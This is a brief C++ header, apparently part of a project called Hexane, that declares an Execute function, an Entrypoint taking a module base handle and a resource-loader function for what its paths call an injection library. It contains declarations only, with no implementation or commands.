#ifndef _HEXANE_INJECTLIB_CONFIG_HPP
#define _HEXANE_INJECTLIB_CONFIG_HPP
#include <core/monolith.hpp>
#include <core/corelib.hpp>
#include <loader/include/resource.hpp>

EXTERN_C VOID Execute();
EXTERN_C FUNCTION VOID Entrypoint(HMODULE Base);

namespace Rsrc {
    FUNCTION VOID RsrcLoader(HMODULE Base);
}
#endif //_HEXANE_INJECTLIB_CONFIG_HPP
